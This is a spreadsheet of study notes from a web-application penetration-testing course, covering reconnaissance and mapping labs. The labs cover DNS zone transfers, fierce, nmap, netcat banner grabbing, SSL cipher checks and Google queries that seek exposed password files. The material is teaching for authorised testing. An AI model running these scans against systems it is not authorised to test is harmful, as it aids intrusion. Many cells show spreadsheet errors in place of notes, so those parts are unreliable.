TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
S542-2.1.13,SEC542,Standard Library,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P13,,,,,,sec542/2.1/index.htm#s13,,,,
S542-2.1.14,SEC542,HTTP Requests Library,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P14,,,,,,sec542/2.1/index.htm#s14,,,,
S542-2.1.18,SEC542,Python Exercise: Create the Script,,,,,,- #!/usr/bin/python,2. Recon & Mapping,2.1 Python,B2P18,,,,,,sec542/2.1/index.htm#s18,,,,
S542-2.1.19,SEC542,Python Exercise: Add HTTP Request Functionality,,,,,,"conn = httplib.HTTPConnection(""www.sec542.org"")
conn.request('GET', url)
resp = conn.getresponse()",2. Recon & Mapping,2.1 Python,B2P19,,,,,,sec542/2.1/index.htm#s19,,,,
S542-2.1.20,SEC542,Python Exercise: Print Various Header Values,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P20,,,,,,sec542/2.1/index.htm#s20,,,,
S542-2.1.21,SEC542,Python Exercise: Iterate through Page IDs,,,,,,"while n<=100:
  conn=httplib.HTTPConnection(""www..."")
  url=""/�index.php?id=""+str(n)
  conn.request('GET', url)
  resp=conn.getrestponse()
  print resp.getheader(""Server"")�Date�Cookie
 � n+=1",2. Recon & Mapping,2.1 Python,B2P21,,,,,,sec542/2.1/index.htm#s21,,,,
S542-2.1.22,SEC542,Python Exercise: Write Results to File,,,,,,-,2. Recon & Mapping,2.1 Python,B2P22,,,,,,sec542/2.1/index.htm#s22,,,,
S542-2.1.23,SEC542,Recon: Section Objectives,,,,,,"Understand how to conduct reconnaissance using publicly availably information, the importance of recon, Whois, DNS - using nslookup, dig, host, and Firece, public sources of information, Google and Google Groups (directirves and search modifieers), automating Google Searches (tools) and Other Useful Open Source Info (press releases, job postings, newsgroups, mailing lists, social networks, etc...).",2. Recon & Mapping,2.1 Recon,B2P23,,,,,,sec542/2.1/index.htm#s23,,,,
S542-2.1.24,SEC542,Recon,,,,,,- Phase 1 of methodology,2. Recon & Mapping,2.1 Recon,B2P24,,,,,,sec542/2.1/index.htm#s24,,,,
S542-2.1.25,SEC542,Recon Example,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P25,,,,,,sec542/2.1/index.htm#s25,,,,
S542-2.1.26,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,,sec542/2.1/index.htm#s26,,,,
S542-2.1.27,SEC542,Target Selection: Defining the Test Scope,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P27,,,,,,sec542/2.1/index.htm#s27,,,,
S542-2.1.28,SEC542,Identifying Target Machines,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P28,,,,,,sec542/2.1/index.htm#s28,,,,
S542-2.1.30,SEC542,Whois Records,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P30,,,,,,sec542/2.1/index.htm#s30,,,,
S542-2.1.31,SEC542,Whois Output,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P31,,,,,,sec542/2.1/index.htm#s31,,,,
S542-2.1.32,SEC542,DNS,,,,,,- Check out the Dan Kaminsky's blackhat or defcon vids on DNS,2. Recon & Mapping,2.1 Recon,B2P32,,,,,,sec542/2.1/index.htm#s32,,,,
S542-2.1.33,SEC542,Nslookup,,,,,,"- Perform traceroute to find ISP. Try zone transfer on ISP DNS.
- nslookup [host] [DNS_Server]",2. Recon & Mapping,2.1 Recon,B2P33,,,,,,sec542/2.1/index.htm#s33,,,,
S542-2.1.34,SEC542,Dig,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P34,,,,,,sec542/2.1/index.htm#s34,,,,
S542-2.1.35,SEC542,Fierce Domain Scanner,,,,,,"- Perl script from Robert Hansen (RSnake) ha.ckers.org/fierce
- Queries system DNS servers to find target DNS servers
- Retrieves SOA records
- Guesses host names from wordlist
- Reverse lookup on next and previous 5 IP addresses
- Uses set of prefixes to find hosts (www2...)
- Lookup hosts in domain: fierce.pl -dns sec542.org 
- Scan IP range: fierce.pl -range 192.168.1.0-255 -dnsservers ns1.sec542.org ",2. Recon & Mapping,2.1 Recon,B2P36,,,,,,sec542/2.1/index.htm#s35,,,,
S542-2.1.36,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,,sec542/2.1/index.htm#s36,,,,
S542-2.1.15,SEC542,File Access,,,,,,"- infile = open('FILENAME', 'r')
- read, readline, readlines, write, close
- for line in infile:
    do action per line",2. Recon & Mapping,2.1 Python,B2P15,,,,,,sec542/2.1/index.htm#s15,,,,
S542-2.1.16,SEC542,,,,,,,,2. Recon & Mapping,2.1 Python,,,,,,,sec542/2.1/index.htm#s16,,,,
S542-2.1.17,SEC542,Python Exercise,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P17,,,,,,sec542/2.1/index.htm#s17,,,,
S542-2.1.37,SEC542,DNS Exercise (Harvesting),,,,,,-,2. Recon & Mapping,2.1 Recon,B2P38,,,,,,sec542/2.1/index.htm#s37,,,,
S542-2.1.38,SEC542,DNS Exercise: Nslookup,,,,,,,2. Recon & Mapping,2.1 Recon,B2P39,,,,,,sec542/2.1/index.htm#s38,,,,
S542-2.1.39,SEC542,DNS Exercise: Dig,,,,,,"- ?dig @ns1.sec542.org sec542.org
- ?dig @ns1.sec542.org sec542.org mx
- ?dig @ns1.sec542.org sec542.org axfr
- Q5: What names/IP of MX for sec542.org?  mail (192.168.1.23) & mail2 (.7)
- Q6: Name and IP for preferred mail exchanger? mail (prio 10) (< mail2:20)
?$ dig @ns1 sec542.org mx

; <<>> DiG 9.5.1-P2 <<>> @ns1 sec542.org mx
; (1 server found)
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15958
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 2, ADDITIONAL: 4

;; QUESTION SECTION:
;sec542.org.   IN MX

;; ANSWER SECTION:
sec542.org.  38400 IN MX 10 mail.sec542.org.
sec542.org.  38400 IN MX 20 mail2.sec542.org.

",2. Recon & Mapping,2.1 Recon,B2P41,,,,,,sec542/2.1/index.htm#s39,,,,
S542-2.1.40,SEC542,DNS Exercise: Host,,,,,,"- Q7: What result is interesting? List of hosts, name servers, aliases (cname)
?$ host -la sec542.org ns1.sec542.org
sec542.org.          SOA ns1.sec542.org. admin.sec542.org. (
   2010040101 ;serial (version)
   28800 ;refresh period (8 hours)
   3600 ;retry interval (1 hour)
   604800 ;expire time (1 week)
   38400 ;default ttl (10 hours, 40 minutes)
   )
sec542.org.          A 192.168.1.41
sec542.org.          NS ns1.sec542.org.
sec542.org.          NS ns2.sec542.org.
sec542.org.          MX 10 mail.sec542.org.
sec542.org.          MX 20 mail2.sec542.org.
bar.sec542.org.      A 192.168.1.18
bootcamp.sec542.org. CNAME www.sec542.org.
dbdev.sec542.org.    A 192.168.1.23
foo.sec542.org.      A 192.168.1.67
hr-web.sec542.org.   A 192.168.1.41
mail.sec542.org.     A 192.168.1.23
mail2.sec542.org.    A 192.168.1.7
ns1.sec542.org.      A 192.168.1.41
ns2.sec542.org.      A 192.168.1.23
webdev.sec542.org.   A 192.168.1.23
www.sec542.org.      A 192.168.1.41
sec542.org.          SOA ns1.sec542.org. admin.sec542.org. (
   2010040101 ;serial (version)
   28800 ;refresh period (8 hours)
   3600 ;retry interval (1 hour)
   604800 ;expire time (1 week)
   38400 ;default ttl (10 hours, 40 minutes)
   )",2. Recon & Mapping,2.1 Recon,B2P42,,,,,,sec542/2.1/index.htm#s40,,,,
S542-2.1.41,SEC542,DNS Exercise: Fierce,,,,,," '- Run commands:
     cd /usr/bin/samurai/fierce2
     fierce -dns sec542.org
     fierce -range 192.168.1.0-255 -dnsservers ns1.sec542.org
?
?samurai@samurai-sec542:/usr/bin/samurai/fierce2$ ./fierce -dns sec542.org
Fierce 2.0beta-r299 ( http://trac.assembla.com/fierce )

Starting Fierce Scan at Thu Mar  3 10:15:20 2011
Args:  -dns sec542.org
Scanning domain sec542.org at Thu Mar  3 10:15:20 2011 ...

Nameservers for sec542.org
    ns2.sec542.org   192.168.1.23    
    ns1.sec542.org   192.168.1.41    
ARIN lookup sec542
Trying Zone Transfer ... 
    ns2.sec542.org    Failed 
    ns1.sec542.org    Sucess! 
  sec542.org. 38400 IN SOA ns1.sec542.org. admin.sec542.org. (
     2010040101 ; Serial
     28800 ; Refresh
     3600 ; Retry
     604800 ; Expire
     38400 ) ; Minimum TTL
sec542.org. 38400 IN A 192.168.1.41
sec542.org. 38400 IN NS ns1.sec542.org.
sec542.org. 38400 IN NS ns2.sec542.org.
sec542.org. 38400 IN MX 10 mail.sec542.org.
sec542.org. 38400 IN MX 20 mail2.sec542.org.
bar.sec542.org. 38400 IN A 192.168.1.18
bootcamp.sec542.org. 38400 IN CNAME www.sec542.org.
dbdev.sec542.org. 38400 IN A 192.168.1.23
foo.sec542.org. 38400 IN A 192.168.1.67
hr-web.sec542.org. 38400 IN A 192.168.1.41
mail.sec542.org. 38400 IN A 192.168.1.23
mail2.sec542.org. 38400 IN A 192.168.1.7
ns1.sec542.org. 38400 IN A 192.168.1.41
ns2.sec542.org. 38400 IN A 192.168.1.23
webdev.sec542.org. 38400 IN A 192.168.1.23
www.sec542.org. 38400 IN A 192.168.1.41
 
 Testing for Wildcards ... 
Trying Prefix Bruteforce ... 
    192.168.1.23   mail.sec542.org
    192.168.1.7   mail2.sec542.org
    192.168.1.41   ns1.sec542.org
Looking for MX records ... 
    10 mail.sec542.org
    20 mail2.sec542.org
Performing Whois Lookups ... 
Performing Reverse Lookups ... 
    sec542.org   192.168.1.41
Finding Nearby IPs ... 
    192.168.1.7   mail2.sec542.org     7.1.168.192.in-addr.arpa
    192.168.1.18   bar.sec542.org     18.1.168.192.in-addr.arpa
Ending domain scan at Thu Mar  3 10:15:20 2011
Elapsed time 37 seconds
Ending Fierce Scan 

End Time: Thu Mar  3 10:15:57 2011
Total Elapsed Time: 37 seconds

?samurai@samurai-sec542:/usr/bin/samurai/fierce2$ ./fierce -range 192.168.1.0-255 -dnsservers 192.168.1.41
Fierce 2.0beta-r299 ( http://trac.assembla.com/fierce )

Starting Fierce Scan at Thu Mar  3 10:16:46 2011
Args:  -dnsservers 192.168.1.41 -range 192.168.1.0-255
Finding Nearby IPs ... 
    192.168.1.23   mail.sec542.org     23.1.168.192.in-addr.arpa
    192.168.1.41   www.sec542.org     41.1.168.192.in-addr.arpa
",2. Recon & Mapping,2.1 Recon,B2P43,,,,,,sec542/2.1/index.htm#s41,,,,
S542-2.1.45,SEC542,Search Engines,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P47,,,,,,sec542/2.1/index.htm#s45,,,,
S542-2.1.46,SEC542,Google Directives,,,,,,"- site:, inurl:, intitle:, link:, ext:",2. Recon & Mapping,2.1 Recon,B2P48,,,,,,sec542/2.1/index.htm#s46,,,,
S542-2.1.47,SEC542,Google Modifiers,,,,,,"- Double quotes
- - omits pages with specific strings
- + forces the inclusion 
- * as wildcard",2. Recon & Mapping,2.1 Recon,B2P49,,,,,,sec542/2.1/index.htm#s47,,,,
S542-2.1.48,SEC542,Google Groups,,,,,,"- groups.google.com
- Google Groups supports groups-specific directives
- author:EMAIL
- insubject:""SUBJECT""",2. Recon & Mapping,2.1 Recon,B2P50,,,,,,sec542/2.1/index.htm#s48,,,,
S542-2.1.49,SEC542,Google Hacking,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P51,,,,,,sec542/2.1/index.htm#s49,,,,
S542-2.1.50,SEC542,Automating Google Searches,,,,,,- Require Google API key (stopped issuing SOAP API keys in Dec. 2006),2. Recon & Mapping,2.1 Recon,B2P52,,,,,,sec542/2.1/index.htm#s50,,,,
S542-2.1.51,SEC542,SensePost's Aura,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P53,,,,,,sec542/2.1/index.htm#s51,,,,
S542-2.1.52,SEC542,SiteDigger,,,,,,"- From FoundStone/McAfee
- Built-in copy of GHDB or Foundstones Google hacks
- Need Aura w/o API key
- Works on Windows or Linux with Wine
- http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx (v3)",2. Recon & Mapping,2.1 Recon,B2P54,,,,,,sec542/2.1/index.htm#s52,,,,
S542-2.1.53,SEC542,Wikto,,,,,,"- Has Aura built-in
- Windows alternative to Nikto
- Vulnerability analysis, spidering with Google hacking, host enum
- www.sensepost.com/research/wikto/",2. Recon & Mapping,2.1 Recon,B2P55,,,,,,sec542/2.1/index.htm#s53,,,,
S542-2.1.54,SEC542,Goolag,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P56,,,,,,sec542/2.1/index.htm#s54,,,,
S542-2.1.55,SEC542,Google Shunning,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P57,,,,,,sec542/2.1/index.htm#s55,,,,
S542-2.1.56,SEC542,Google Alerts,,,,,,"Useful Google alerts during PenTesting to find new pages:
- site:sans.org
- site:sans.org intitle:Error Occurred While""
- site:sans.org ""Index of / +passwd",2. Recon & Mapping,2.1 Recon,B2P58,,,,,,sec542/2.1/index.htm#s56,,,,
S542-2.1.57,SEC542,Press Releases and Job Postings,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P59,,,,,,sec542/2.1/index.htm#s57,,,,
S542-2.1.58,SEC542,Newsgroups and Mailing Lists,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P60,,,,,,sec542/2.1/index.htm#s58,,,,
S542-2.1.59,SEC542,Social Networks,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P61,,,,,,sec542/2.1/index.htm#s59,,,,
S542-2.1.60,SEC542,Automated Social Network Parsing,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P62,,,,,,sec542/2.1/index.htm#s60,,,,
S542-2.1.61,SEC542,Using the scripts,,,,,,"- gpscan.rb Microsoft
- usernameGen.py InGuardians 10",2. Recon & Mapping,2.1 Recon,B2P63,,,,,,sec542/2.1/index.htm#s61,,,,
S542-2.1.62,SEC542,Other Sites,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P64,,,,,,sec542/2.1/index.htm#s62,,,,
S542-2.1.43,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,,sec542/2.1/index.htm#s43,,,,
S542-2.1.42,SEC542,DNS Exercise: Answers,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P44,,,,,,sec542/2.1/index.htm#s42,,,,
S542-2.1.44,SEC542,Open Source Information,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P46,,,,,,sec542/2.1/index.htm#s44,,,,
S542-2.1.63,SEC542,Maltego,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P65,,,,,,sec542/2.1/index.htm#s63,,,,
S542-2.1.64,SEC542,Maltego screenshot,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P66,,,,,,sec542/2.1/index.htm#s64,,,,
S542-2.1.65,SEC542,Differences between  Maltego CE and Pro,,,,,,"- Nag screen, save/export disabled, limited zom, transforms on 1  entity�
- 75 transforms per day
- Throttles comms between client and server",2. Recon & Mapping,2.1 Recon,B2P67,,,,,,sec542/2.1/index.htm#s65,,,,
S542-2.2.01,SEC542,Mapping: Section Objectives,,,,,,"Understand portscanning, OS fingerprinting, Version Scanning , and banner grabbing, port scanning (nmap), OS versioning (nmap, p0f), determining server versions/banner grabbing (netcat, httpring, nmap), determining ssl support (openssl, THCSSLCheck, SSLDigger, identifying Virtual Hosting, identifying Load balancing (URL, timestamp analysis, lasts modified date, load balancer cookies, ssl differences, source differences), testing on load-balanced infrastructures, and Identifying Software Configuration.",2. Recon & Mapping,2.2 Mapping,B2P68,,,,,,sec542/2.2/index.htm#s1,,,,
S542-2.2.02,SEC542,Mapping Phase Components,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P69,,,,,,sec542/2.2/index.htm#s2,,,,
S542-2.2.04,SEC542,Nmap,,,,,,- 2nd generation OS fingerprinting,2. Recon & Mapping,2.2 Mapping,B2P71,,,,,,sec542/2.2/index.htm#s4,,,,
S542-2.2.05,SEC542,Nmap Example,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P72,,,,,,sec542/2.2/index.htm#s5,,,,
S542-2.2.03,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s3,,,,
S542-2.2.09,SEC542,Nmap,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P76,,,,,,sec542/2.2/index.htm#s9,,,,
S542-2.2.10,SEC542,Netcat to Grab Server String,,,,,,"- printf ""GET / HTTP/1.0\n\n"" | nc -v www.inguardians.com 80",2. Recon & Mapping,2.2 Mapping,B2P77,,,,,,sec542/2.2/index.htm#s10,,,,
S542-2.2.11,SEC542,Netcat Server Version,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P78,,,,,,sec542/2.2/index.htm#s11,,,,
S542-2.2.12,SEC542,HTTPrint,,,,,,"- Cross platform. GUI on Windows (or WINE)
- www.net-square.com/httprint/",2. Recon & Mapping,2.2 Mapping,B2P79,,,,,,sec542/2.2/index.htm#s12,,,,
S542-2.2.13,SEC542,Netcraft,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P80,,,,,,sec542/2.2/index.htm#s13,,,,
S542-2.2.14,SEC542,Netcraft Example,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P81,,,,,,sec542/2.2/index.htm#s14,,,,
S542-2.2.15,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s15,,,,
S542-2.2.16,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s16,,,,
S542-2.2.17,SEC542,Web Server Fingerprinting Exercise: Netcat,,,,,,"- Q1: What info is received? Apache/PHP/OS/SSL versions, Date/Time
- Q2: With port 443, what's the response/error? 400 Bad Request (plain HTTP to SSL server)
?$ nc www.sec542.org 80
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Thu, 03 Mar 2011 19:28:13 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
Last-Modified: Sun, 22 Nov 2009 15:52:20 GMT
ETag: ""1c098-49b-478f7b1acf500""
Accept-Ranges: bytes
Content-Length: 1179
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

?$ nc www.sec542.org 443
HEAD / HTTP/1.0
<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
Instead use the HTTPS scheme to access this URL, please.<br />
<blockquote>Hint: <a href=""https://www.sec542.org/""><b>https://www.sec542.org/</b></a></blockquote></p>
<hr>
<address>Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g Server at www.sec542.org Port 443</address>
</body></html>
",2. Recon & Mapping,2.2 Mapping,B2P84,,,,,,sec542/2.2/index.htm#s17,,,,
S542-2.2.18,SEC542,Web Server Fingerprinting Exercise: Nmap,,,,,,"Q3: What services did nmap identify? 
       OpenSSH(22),  ISC Bind (53), http(80), https(443), webmin(10000)
- Q4: How many different web servers apps? Apache/PH and webmin
- Q5: On which ports? 80, 443, 10000
?$ nmap --script=robots www.sec542.org

Starting Nmap 5.00 ( http://nmap.org ) at 2011-03-03 14:37 EST
Interesting ports on sec542 (192.168.1.41):
Not shown: 995 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
|  robots: has 2 disallowed entries 
|_ /cgi-bin/ /admin
443/tcp   open  https
10000/tcp open  snet-sensor-mgmt
",2. Recon & Mapping,2.2 Mapping,B2P85,,,,,,sec542/2.2/index.htm#s18,,,,
S542-2.2.19,SEC542,Web Server Fingerprinting Exercise: HTTPrint,,,,,,#REF!,2. Recon & Mapping,2.2 Mapping,B2P86,,,,,,sec542/2.2/index.htm#s19,,,,
S542-2.2.20,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s20,,,,
S542-2.2.21,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s21,,,,
S542-2.2.22,SEC542,Analyzing SSL Support,,,,,,"- Which SSL versions? SSLv2, v3 or TLSv1
- Which ciphers? 128 bit? NULL cipher?
- Self-signed certs ",2. Recon & Mapping,2.2 Mapping,B2P89,,,,,,sec542/2.2/index.htm#s22,,,,
S542-2.2.23,SEC542,Scripting OpenSSL,,,,,,"- openssl s_client -connect www.sans.org -ssl2
- openssl s_client -connect www.sans.org:443 -cipher NULL
- Very scriptable",2. Recon & Mapping,2.2 Mapping,B2P90,,,,,,sec542/2.2/index.htm#s23,,,,
S542-2.2.24,SEC542,THC SSL Check,,,,,,"- The Hacker's Choice, http://thc.org/root/tools/THCSSLCheck.zip
- wine THCSSLCheck.exe SITE PORT",2. Recon & Mapping,2.2 Mapping,B2P91,,,,,,sec542/2.2/index.htm#s24,,,,
S542-2.2.25,SEC542,SSLDigger,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P92,,,,,,sec542/2.2/index.htm#s25,,,,
S542-2.2.26,SEC542,Evaluating SSL Support,,,,,,"- Strengh and correct SSL support level depend on site
- SSLv2 weak
- Less than 128 bit encryption
- Weak hashing (MD5)
- Expired, bad or other certificate errors",2. Recon & Mapping,2.2 Mapping,B2P93,,,,,,sec542/2.2/index.htm#s26,,,,
S542-2.2.06,SEC542,p0f,,,,,,"- Approx. 90% accuracy
- lcamtuf.coredump.cx/p0f.shtml",2. Recon & Mapping,2.2 Mapping,B2P73,,,,,,sec542/2.2/index.htm#s6,,,,
S542-2.2.07,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s7,,,,
S542-2.2.08,SEC542,Server Version,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P75,,,,,,sec542/2.2/index.htm#s8,,,,
S542-2.2.27,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s27,,,,
S542-2.2.28,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s28,,,,
S542-2.2.29,SEC542,SSL Strength Exercise: Launching SSLCheck,,,,,,"?/usr/bin/samurai/thcsslcheck$ ./THCSSLCheck.exe www.sec542.org 443 > ~/THC_443.txt
?/usr/bin/samurai/thcsslcheck$ cat ~/THC_443.txt


------------------------------------------------------------------------
THCSSLCheck v0.1 - coding johnny cyberpunk (www.thc.org) 2004
------------------------------------------------------------------------

[*] testing if port is up. pleaze wait...
[*] port is up !
[*] testing if service speaks SSL ...
[*] service speaks SSL !


[*] now testing SSLv2
----------------------------------------------------------------------
                  DES-CBC3-MD5 - 168 Bits -   supported
                  IDEA-CBC-MD5 - 128 Bits - unsupported
                   RC2-CBC-MD5 - 128 Bits -   supported
                       RC4-MD5 - 128 Bits -   supported
                    RC4-64-MD5 -  64 Bits - unsupported
                   DES-CBC-MD5 -  56 Bits -   supported
               EXP-RC2-CBC-MD5 -  40 Bits -   supported
                   EXP-RC4-MD5 -  40 Bits -   supported


[*] now testing SSLv3
----------------------------------------------------------------------
            DHE-RSA-AES256-SHA - 256 Bits - unsupported
            DHE-DSS-AES256-SHA - 256 Bits - unsupported
                    AES256-SHA - 256 Bits - unsupported
          EDH-RSA-DES-CBC3-SHA - 168 Bits -   supported
          EDH-DSS-DES-CBC3-SHA - 168 Bits - unsupported
...",2. Recon & Mapping,2.2 Mapping,B2P96,,,,,,sec542/2.2/index.htm#s29,,,,
S542-2.2.30,SEC542,SSL Strength Exercise: SSLThing,,,,,,"?samurai@samurai-sec542:/usr/bin/samurai/sslthing$ ./sslthing www.sec542.org:443 > ~/sslthing_443.txt
samurai@samurai-sec542:/usr/bin/samurai/sslthing$ cat ~/sslthing_443.txt
Testing SSL2...
DES-CBC3-MD5 - 168 bits
RC2-CBC-MD5 - 128 bits
RC4-MD5 - 128 bits
DES-CBC-MD5 - 56 bits
EXP-RC2-CBC-MD5 - 40 bits
EXP-RC4-MD5 - 40 bits
Testing TLS1...
EDH-RSA-DES-CBC3-SHA - 168 bits
DES-CBC3-SHA - 168 bits
RC4-SHA - 128 bits
RC4-MD5 - 128 bits
EDH-RSA-DES-CBC-SHA - 56 bits
DES-CBC-SHA - 56 bits
EXP-EDH-RSA-DES-CBC-SHA - 40 bits
EXP-DES-CBC-SHA - 40 bits
EXP-RC2-CBC-MD5 - 40 bits
EXP-RC4-MD5 - 40 bits
samurai@samurai-sec542:/usr/bin/samurai/sslthing$ 
",2. Recon & Mapping,2.2 Mapping,B2P97,,,,,,sec542/2.2/index.htm#s30,,,,
S542-2.2.31,SEC542,SSL Strength Exercise: Examine the Results,,,,,,- Q1: Report 1st glance impression? Disable SSLv2,2. Recon & Mapping,2.2 Mapping,B2P98,,,,,,sec542/2.2/index.htm#s31,,,,
S542-2.2.35,SEC542,Load Balancers,,,,,,"- May lead for false negatives (tests appear to have failed)
- Various methods to identify load balancers (analysis of URL, timestamp, last modified  values comparison, load balancer cookies, SSL differences, HTML source code discrepancies)",2. Recon & Mapping,2.2 Mapping,B2P103,,,,,,sec542/2.2/index.htm#s35,,,,
S542-2.2.36,SEC542,Load Balancing via URL,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P104,,,,,,sec542/2.2/index.htm#s36,,,,
S542-2.2.37,SEC542,Load Balancing identification using Timestamp analysis,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P105,,,,,,sec542/2.2/index.htm#s37,,,,
S542-2.2.38,SEC542,Load Balancing identification using Last Modified Date,,,,,,- May help to identify a server app that wasn't updated (finding),2. Recon & Mapping,2.2 Mapping,B2P106,,,,,,sec542/2.2/index.htm#s38,,,,
S542-2.2.39,SEC542,Load Balancing identification using Load Balancer Cookies,,,,,,"- Look for F5, LB, Load or Balance in the cookie-name
- Used to help determien which server to user
- Cisco CSS (content switches) or Big-IP
- Don't recognize a cookie? Google it!",2. Recon & Mapping,2.2 Mapping,B2P107,,,,,,sec542/2.2/index.htm#s39,,,,
S542-2.2.40,SEC542,Load Balancing identification using SSL Differences,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P108,,,,,,sec542/2.2/index.htm#s40,,,,
S542-2.2.32,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s32,,,,
S542-2.2.42,SEC542,Testing Web Apps on Load-Balanced Architectures,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P110,,,,,,sec542/2.2/index.htm#s42,,,,
S542-2.2.43,SEC542,Test Modifications for Load Balancers,,,,,,"- If possible, address each server individually (www1, www2�). May required testing from inside
- Modify load balancer to direct tester's traffic (client IP address)",2. Recon & Mapping,2.2 Mapping,B2P111,,,,,,sec542/2.2/index.htm#s43,,,,
S542-2.2.44,SEC542,Analyzing Software Configs,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P112,,,,,,sec542/2.2/index.htm#s44,,,,
